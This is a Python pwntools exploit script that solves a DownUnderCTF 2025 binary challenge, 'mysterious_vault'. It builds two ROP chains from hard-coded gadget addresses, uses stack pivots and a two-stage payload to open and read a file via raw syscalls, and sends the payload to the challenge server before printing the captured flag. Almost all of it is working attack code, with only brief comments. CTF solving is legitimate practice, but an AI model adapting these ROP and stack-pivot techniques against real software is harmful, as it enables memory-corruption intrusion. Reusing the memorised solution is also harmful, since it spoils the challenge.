import sysv_ipc
from pwn import *


# this is used for testing
# i create the shared mem and write what i want in it
# then test my payload on password_handler_3000 and password_handler_3001
KEY = 0xdeadbeef
SIZE = 0x200  
try:
    shm = sysv_ipc.SharedMemory(KEY, sysv_ipc.IPC_CREX, size=SIZE)
    print("[*] Created shared memory.")
except sysv_ipc.ExistentialError:
    shm = sysv_ipc.SharedMemory(KEY)
    print("[*] Attached to existing shared memory.")


context.arch = "amd64"

# my gadgets
_1_syscall = 0x4386cc
_1_pop_rax = 0x418462
_1_pop_rdi = 0x402371
_1_pop_rsi = 0x404fe2 
_1_pop_rsp =  0x404591

_2_pop_rax = 0x41dc79
_2_pop_rsi = 0x41d163
_2_pop_rdi = 0x41d282
_2_syscall_pop = 0x419f82
_2_pop_rsp_r14_r15 = 0x41d27e 
_2_rw_bss_addr = 0x44f000 + 0x500
password_addr = 0x13371e0


# _1_payload, open, read , exit
_1_payload = flat([
    _1_pop_rdi, password_addr,
    _1_pop_rsi, 0,
    _1_pop_rax, 2,
    _1_syscall,

    _1_pop_rsi, 0x1337000,
    _1_pop_rdi, 0,
    _1_pop_rax, 0,    
    _1_syscall,

    _1_pop_rax, 0x3c,
    _1_pop_rdi, 0x0,
    _1_syscall,
])
_1_pivot = flat([
    _1_pop_rsp, 0x1337000 + 8
])



# _2_payload, open, read , exit
# 2 stages bc not enough mem
_2_payload_stage1 = flat([
    _2_syscall_pop,
    _2_rw_bss_addr,

    _2_pop_rsi, 0,
    _2_pop_rdi, password_addr + 0x10,

    _2_pop_rsp_r14_r15,
    0x1337008 + 216 + 16 + 16,    
])
_2_payload_stage2 = flat([
    _2_pop_rax, 2,
    _2_syscall_pop,
    _2_rw_bss_addr,    

    _2_pop_rsi, 0x1337020,
    _2_pop_rdi, 0,
    _2_pop_rax, 0,
    _2_syscall_pop,
    _2_rw_bss_addr,    

    _2_pop_rdi, 0,
    _2_pop_rax, 0x3c,
    _2_syscall_pop,
])
_2_pivot = flat([
    _2_pop_rsp_r14_r15,
    0x1337008 + len(_1_payload),
])


payload = _1_payload + _2_payload_stage1
print("len(payload)",len(payload))
assert len(payload) <= 216



# used for testing, set counter and length
# data = p32(0)
# data += p32(0x200)


# final payload
# 216: pivot second
# 232: pivot first
# second overflows a bit so stage 2
# B and C are used for padding of the gadget
data = b""
data +=  b"".join([
    payload.ljust(216),
    _2_pivot,
    _1_pivot,
    b"B" * 8, 
    b"C" * 8,
    _2_payload_stage2, 

]).ljust(0x200 - 8 - 0x20,b"\x00") 

# write password in mem
# wrote it twice bc testing shit
data += b"password".ljust(0x10,b"\x00")
data += b"password".ljust(0x10,b"\x00")



elf = context.binary = ELF("./mysterious_vault")


# send the payload
p = remote("chal.2025.ductf.net", 30019)
# p = process()
p.sendline(":)")
p.sendline(data)


# you can test it localy by waiting and writing the the shared mem
# p.recvuntil("AUTHENTICATING")
# shm.write(data)


p.interactive()

# DUCTF{pushing_and_popping_and_so_on_and_so_forth}